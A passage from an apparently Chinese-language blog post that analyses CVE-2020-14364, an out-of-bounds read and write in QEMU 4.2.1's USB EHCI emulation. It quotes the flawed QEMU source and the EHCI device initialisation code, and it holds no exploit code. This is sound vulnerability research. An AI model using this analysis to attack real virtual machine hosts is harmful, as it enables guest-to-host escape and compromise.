qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);	<span class="hljs-comment">// mem与xlen来自sgl-&gt;sg[i].base与sgl-&gt;sg[i].len</span><br>            len -= xlen;<br>            base += xlen;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    usb_packet_unmap(p, sgl);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_iovec_add</span><span class="hljs-params">(QEMUIOVector *qiov, <span class="hljs-type">void</span> *base, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    assert(qiov-&gt;nalloc != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">if</span> (qiov-&gt;niov == qiov-&gt;nalloc) &#123;<br>        qiov-&gt;nalloc = <span class="hljs-number">2</span> * qiov-&gt;nalloc + <span class="hljs-number">1</span>;<br>        qiov-&gt;iov = g_renew(<span class="hljs-keyword">struct</span> iovec, qiov-&gt;iov, qiov-&gt;nalloc);<br>    &#125;<br>    qiov-&gt;iov[qiov-&gt;niov].iov_base = base;<br>    qiov-&gt;iov[qiov-&gt;niov].iov_len = len;<br>    qiov-&gt;size += len;<br>    ++qiov-&gt;niov;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接下来就看<code>sgl-&gt;sg[i].base</code> 与<code>sgl-&gt;sg[i].len</code> 从何处而来即可。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ehci_execute</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_init_transfer</span><span class="hljs-params">(EHCIPacket *p)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> cpage, offset, bytes, plen;<br>    <span class="hljs-type">dma_addr_t</span> page;<br><br>    cpage = get_field(p-&gt;qtd.token, QTD_TOKEN_CPAGE);<br>    bytes = get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES);<br>    offset = p-&gt;qtd.bufptr[<span class="hljs-number">0</span>] &amp; ~QTD_BUFPTR_MASK;<br>    qemu_sglist_init(&amp;p-&gt;sgl, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;device, <span class="hljs-number">5</span>, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;as);<br><br>    <span class="hljs-keyword">while</span> (bytes &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cpage &gt; <span class="hljs-number">4</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;cpage out of range (%d)\n&quot;</span>, cpage);<br>            qemu_sglist_destroy(&amp;p-&gt;sgl);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        page = p-&gt;qtd.bufptr[cpage] &amp; QTD_BUFPTR_MASK;<br>        page += offset;<br>        plen = bytes;<br>        <span class="hljs-keyword">if</span> (plen &gt; <span class="hljs-number">4096</span> - offset)<br>        &#123;<br>            plen = <span class="hljs-number">4096</span> - offset;<br>            offset = <span class="hljs-number">0</span>;<br>            cpage++;<br>        &#125;<br><br>        qemu_sglist_add(&amp;p-&gt;sgl, page, plen);	<span class="hljs-comment">// page与len来自p-&gt;qtd.token字段</span><br>        bytes -= plen;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_sglist_add</span><span class="hljs-params">(QEMUSGList *qsg, <span class="hljs-type">dma_addr_t</span> base, <span class="hljs-type">dma_addr_t</span> len)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (qsg-&gt;nsg == qsg-&gt;nalloc) &#123;<br>        qsg-&gt;nalloc = <span class="hljs-number">2</span> * qsg-&gt;nalloc + <span class="hljs-number">1</span>;<br>        qsg-&gt;sg = g_realloc(qsg-&gt;sg, qsg-&gt;nalloc * <span class="hljs-keyword">sizeof</span>(ScatterGatherEntry));<br>    &#125;<br>    qsg-&gt;sg[qsg-&gt;nsg].base = base;<br>    qsg-&gt;sg[qsg-&gt;nsg].len = len;<br>    qsg-&gt;size += len;<br>    ++qsg-&gt;nsg;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>p-&gt;qtd.token</code> 字段是我们可以控制的，总的来说，调用<code>usb_packet_map</code> 函数可以实现用户可控内容读写。</p>
<h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p><code>qemu-4.2.1\hw\usb\core.c: do_token_setup</code></p>
<p>[1]处调用<code>usb_packet_copy</code> 函数控制变量<code>s-&gt;setup_buf</code>，[2]处根据<code>s-&gt;setup_buf</code> 为变量<code>s-&gt;setup_len</code>赋值，其最大为0xffff，但是[3]处判断逻辑出现问题，使得<code>s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)</code> 条件成立的情况下，依然为变量<code>s-&gt;setup_len</code> 赋值，没有起到检查的效果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_setup</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-type">int</span> request, value, index;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;iov.size != <span class="hljs-number">8</span>) &#123;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);	<span class="hljs-comment">// [1]</span><br>    s-&gt;setup_index = <span class="hljs-number">0</span>;<br>    p-&gt;actual_length = <span class="hljs-number">0</span>;<br>    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">6</span>];	<span class="hljs-comment">// [2]</span><br>    <span class="hljs-keyword">if</span> (s-&gt;setup_len &gt; <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf)) &#123;	<span class="hljs-comment">// [3]</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                <span class="hljs-string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,<br>                s-&gt;setup_len, <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf));<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    request = (s-&gt;setup_buf[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">1</span>];<br>    value   = (s-&gt;setup_buf[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">2</span>];<br>    index   = (s-&gt;setup_buf[<span class="hljs-number">5</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>        usb_device_handle_control(s, p, request, value, index,<br>                                  s-&gt;setup_len, s-&gt;data_buf);<br>        <span class="hljs-keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;<br>            s-&gt;setup_state = SETUP_STATE_SETUP;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (p-&gt;status != USB_RET_SUCCESS) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (p-&gt;actual_length &lt; s-&gt;setup_len) &#123;<br>            s-&gt;setup_len = p-&gt;actual_length;<br>        &#125;<br>        s-&gt;setup_state = SETUP_STATE_DATA;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_len == <span class="hljs-number">0</span>)<br>            s-&gt;setup_state = SETUP_STATE_ACK;<br>        <span class="hljs-keyword">else</span><br>            s-&gt;setup_state = SETUP_STATE_DATA;<br>    &#125;<br><br>    p-&gt;actual_length = <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><code>qemu-4.2.1\hw\usb\core.c：do_token_in</code></p>
<p>[1]处通过<code>s-&gt;setup_len</code>获取<code>len</code>字段，而<code>p-&gt;iov.size</code> 根据上述分析用户可控，然后在[2]处调用<code>usb_packet_copy</code> 函数造成越界访问，从而获取越界读。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_in</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-type">int</span> request, value, index;<br><br>    assert(p-&gt;ep-&gt;nr == <span class="hljs-number">0</span>);<br><br>    request = (s-&gt;setup_buf[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">1</span>];<br>    value   = (s-&gt;setup_buf[<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">2</span>];<br>    index   = (s-&gt;setup_buf[<span class="hljs-number">5</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">4</span>];<br><br>    <span class="hljs-keyword">switch</span>(s-&gt;setup_state) &#123;<br>    <span class="hljs-keyword">case</span> SETUP_STATE_ACK:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            usb_device_handle_control(s, p, request, value, index,<br>                                      s-&gt;setup_len, s-&gt;data_buf);<br>            <span class="hljs-keyword">if</span> (p-&gt;status == USB_RET_ASYNC) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            s-&gt;setup_state = SETUP_STATE_IDLE;<br>            p-&gt;actual_length = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:	<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;	<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;	<span class="hljs-comment">// [1]</span><br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);	<span class="hljs-comment">// [2]</span><br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        s-&gt;setup_state = SETUP_STATE_IDLE;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        p-&gt;status = USB_RET_STALL;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><code>qemu-4.2.1\hw\usb\core.c：do_token_out</code></p>
<p>同理，[1]处通过<code>s-&gt;setup_len</code>获取<code>len</code>字段，而<code>p-&gt;iov.size</code> 根据上述分析用户可控，然后在[2]处调用<code>usb_packet_copy</code> 函数造成越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_out</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    assert(p-&gt;ep-&gt;nr == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">switch</span>(s-&gt;setup_state) &#123;<br>    <span class="hljs-keyword">case</span> SETUP_STATE_ACK:<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>            s-&gt;setup_state = SETUP_STATE_IDLE;<br>            <span class="hljs-comment">/* transfer OK */</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* ignore additional output */</span><br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;	<span class="hljs-comment">// [1]</span><br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);	<span class="hljs-comment">// [2]</span><br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        s-&gt;setup_state = SETUP_STATE_IDLE;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        p-&gt;status = USB_RET_STALL;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="USB设备初始化"><a href="#USB设备初始化" class="headerlink" title="USB设备初始化"></a>USB设备初始化</h3><p>USB控制器是连接USB设备与计算机系统的桥梁。USB控制器负责管理USB总线上的通信，并确保USB设备能够正确地与计算机交互。</p>
<p><strong>USB控制器类型</strong></p>
<p>OHCI、UHCI都是USB1.1的接口标准，而EHCI是对应USB2.0的接口标准，最新的xHCI是USB3.0的接口标准。</p>
<p>OHCI( Open Host Controller Interface ) ：一个不仅仅是usb用的主控制器接口标准。主要是遵循csr (configuration space register)标准。是其他厂商在设计usb host controller时遵循的标准，如via, nec, ali, 包括nvidia等等。支持USB1.1的标准。</p>
<p>UHCI (Universal Host Controller Interface )，是Intel主导的对USB1.0、1.1的接口标准，与OHCI不兼容。</p>
<p>EHCI(Enhanced Host Controller Interface ) ，是Intel主导的USB2.0的接口标准。EHCI仅提供USB2.0的高速功能，而依靠UHCI或OHCI来提供对全速(full-speed)或低速(low-speed)设备的支持。</p>
<p>xHCI( eXtensible Host Controller Interface )，是最新的USB3.0的接口标准，它在速度、节能、虚拟化等方面都比前面3中有了较大的提高。xHCI 支持所有种类速度的USB设备(USB 3.0 SuperSpeed, USB 2.0 Low-, Full-, and High-speed, USB 1.1 Low- and Full-speed)。xHCI的目的是为了替换前面三种(UHCI&#x2F;OHCI&#x2F;EHCI)。</p>
<p><img src="/img/CVE-2020-14364/image-20240726103418073.png" srcset="/img/loading.gif" lazyload alt="image-20240726103418073"></p>
<p><strong>USB控制器初始化</strong></p>
<p>在QEMU启动日志中可以看到，USB使用的控制器类型是EHCI，具体模拟的设备为ehci-pci，基于此设备控制USB设备的行为。</p>
<p><img src="/img/CVE-2020-14364/image-20240725104008232.png" srcset="/img/loading.gif" lazyload alt="image-20240725104008232"></p>
<p>查看ehci-pci设备的具体初始化过程。ehci_pci设备的初始化符合QOM模型。</p>
<p>首先查看echi_pci类型注册过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo ehci_pci_type_info = &#123;<br>    .name = TYPE_PCI_EHCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(EHCIPCIState),<br>    .instance_init = usb_ehci_pci_init,<br>    .instance_finalize = usb_ehci_pci_finalize,<br>    .abstract = <span class="hljs-literal">true</span>,<br>    .class_init = ehci_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br>type_register_static(&amp;ehci_pci_type_info);<br></code></pre></td></tr></table></figure>

<p>从类型注册中可以看到，类型初始化函数为<code>ehci_class_init</code>，类型的实例初始化函数为<code>usb_ehci_pci_init</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_class_init</span><span class="hljs-params">(ObjectClass *klass, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(klass);<br>    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);<br><br>    k-&gt;realize = usb_ehci_pci_realize;<br>    k-&gt;<span class="hljs-built_in">exit</span> = usb_ehci_pci_exit;<br>    k-&gt;class_id = PCI_CLASS_SERIAL_USB;<br>    k-&gt;config_write = usb_ehci_pci_write_config;<br>    dc-&gt;vmsd = &amp;vmstate_ehci_pci;<br>    dc-&gt;props = ehci_pci_properties;<br>    dc-&gt;reset = usb_ehci_pci_reset;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_pci_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);<br>    EHCIPCIState *i = PCI_EHCI(obj);<br>    EHCIState *s = &amp;i-&gt;ehci;<br><br>    s-&gt;caps[<span class="hljs-number">0x09</span>] = <span class="hljs-number">0x68</span>;        <span class="hljs-comment">/* EECP */</span><br><br>    s-&gt;capsbase = <span class="hljs-number">0x00</span>;<br>    s-&gt;opregbase = <span class="hljs-number">0x20</span>;<br>    s-&gt;portscbase = <span class="hljs-number">0x44</span>;<br>    s-&gt;portnr = NB_PORTS;<br><br>    <span class="hljs-keyword">if</span> (!dc-&gt;hotpluggable) &#123;<br>        s-&gt;companion_enable = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    usb_ehci_init(s, DEVICE(obj));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_init</span><span class="hljs-params">(EHCIState *s, DeviceState *dev)</span><br>&#123;<br>    <span class="hljs-comment">/* 2.2 host controller interface version */</span><br>    s-&gt;caps[<span class="hljs-number">0x00</span>] = (<span class="hljs-type">uint8_t</span>)(s-&gt;opregbase - s-&gt;capsbase);<br>    s-&gt;caps[<span class="hljs-number">0x01</span>] = <span class="hljs-number">0x00</span>;<br>    s-&gt;caps[<span class="hljs-number">0x02</span>] = <span class="hljs-number">0x00</span>;<br>    s-&gt;caps[<span class="hljs-number">0x03</span>] = <span class="hljs-number">0x01</span>;      <span class="hljs-comment">/* HC version */</span><br>    s-&gt;caps[<span class="hljs-number">0x04</span>] = s-&gt;portnr; <span class="hljs-comment">/* Number of downstream ports */</span><br>    s-&gt;caps[<span class="hljs-number">0x05</span>] = <span class="hljs-number">0x00</span>;      <span class="hljs-comment">/* No companion ports at present */</span><br>    s-&gt;caps[<span class="hljs-number">0x06</span>] = <span class="hljs-number">0x00</span>;<br>    s-&gt;caps[<span class="hljs-number">0x07</span>] = <span class="hljs-number">0x00</span>;<br>    s-&gt;caps[<span class="hljs-number">0x08</span>] = <span class="hljs-number">0x80</span>; <span class="hljs-comment">/* We can cache whole frame, no 64-bit */</span><br>    s-&gt;caps[<span class="hljs-number">0x0a</span>] = <span class="hljs-number">0x00</span>;<br>    s-&gt;caps[<span class="hljs-number">0x0b</span>] = <span class="hljs-number">0x00</span>;<br><br>    QTAILQ_INIT(&amp;s-&gt;aqueues);<br>    QTAILQ_INIT(&amp;s-&gt;pqueues);<br>    usb_packet_init(&amp;s-&gt;ipacket);<br><br>    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), <span class="hljs-string">&quot;ehci&quot;</span>, MMIO_SIZE);<br>    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,<br>                          <span class="hljs-string">&quot;capabilities&quot;</span>, CAPA_SIZE);<br>    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,<br>                          <span class="hljs-string">&quot;operational&quot;</span>, s-&gt;portscbase);<br>    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,<br>                          <span class="hljs-string">&quot;ports&quot;</span>, <span class="hljs-number">4</span> * s-&gt;portnr);<br><br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);<br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);<br>    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,<br>                                &amp;s-&gt;mem_ports);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>ehci_class_init</code> 函数注册设备的实现函数为<code>usb_ehci_pci_realize</code>。</p>
<p><code>usb_ehci_pci_init</code> 函数初始化<code>EHCIState</code> 结构体部分字段，并调用<code>usb_ehci_init</code> 函数为<code>EHCIState</code> 的<code>caps opreg ports</code> 等字段注册回调函数，通过读写相应内存，可触发相关回调函数。不同字段的访问基地址和范围是不同的，<code>caps</code> 基址定义在<code>capsbase</code>，也即<code>0x0</code>，<code>opreg</code> 基址定义在<code>portscbase</code>，也即<code>0x20</code> 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_caps_ops = &#123;<br>    .read = ehci_caps_read,<br>    .write = ehci_caps_write,<br>    .valid.min_access_size = <span class="hljs-number">1</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .impl.min_access_size = <span class="hljs-number">1</span>,<br>    .impl.max_access_size = <span class="hljs-number">1</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span 